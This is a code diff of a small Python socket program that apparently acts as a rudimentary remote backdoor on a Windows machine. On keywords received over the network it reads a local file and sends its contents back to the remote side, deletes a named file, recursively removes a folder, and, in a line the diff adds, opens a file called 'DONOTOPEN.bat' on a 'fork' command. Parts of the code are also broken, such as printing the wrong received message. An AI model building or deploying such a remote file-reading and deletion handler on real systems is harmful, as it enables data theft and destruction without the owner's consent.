@@ -1,9 +1,11 @@
 import socket, winsound, os, shutil
 
+s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 host = socket.gethostbyname(socket.gethostname())
+
 print("▓█████▄ ▓█████ ▓█████  ██▓███   ███▄    █ ▓█████▄▄▄█████▓")
 print("▒██▀ ██▌▓█   ▀ ▓█   ▀ ▓██░  ██▒ ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒")
 print("░██   █▌▒███   ▒███   ▓██░ ██▓▒▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░")
@@ -25,16 +27,13 @@ def receive():
     print('Got connection from', addr)
     a = c.recv(5000)
     print('Received message == ',a)
-    
-    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s2.connect((o, port2))
-    v = input("Type in response")
+    v = input("Type in response: ")
     s2.send(bytes(str(v), 'utf-8'))
     if bytes("close", 'utf-8') in a:
        winsound.PlaySound("roblox.wav", winsound.SND_FILENAME)
        s.close()
        
-      
     if bytes("read", 'utf-8') in a:
        address = 'C:\\Program Files (x86)\\Steam\\skins\\skins_readme.txt'
        f = open(address,'rb')  
@@ -43,6 +42,7 @@ def receive():
        s2.send(bytes(str(data), 'utf-8'))
        print("File text received")
        f.close()
+       
     if bytes("delete", 'utf-8') in a:
        os.remove("C:/Users/iD Student/Desktop/GRAHAM B/abc/abcd.txt")
        print("Text file deleted")
@@ -50,19 +50,19 @@ def receive():
     if bytes("dels", 'utf-8') in a:
         shutil.rmtree("C:/Users/iD Student/Documents/deleteee")
         print("File deleted")
-       
-       
+
+    if bytes("fork", 'utf-8') in a:
+        b = open("DONOTOPEN.bat", 'r')
     else:
         a2 = c.recv(500)
         print('Received message == ',a2)
-        v = input("Type in response")
+        v = input("Type in response: ")
         s2.send(bytes(str(v), 'utf-8'))
        
     while True:
-        
         a3 = c.recv(500)
         print('Received message == ',a2)
-        v = input("Type in response")
+        v = input("Type in response: ")
         s2.send(bytes(str(v), 'utf-8'))
              
 while True:
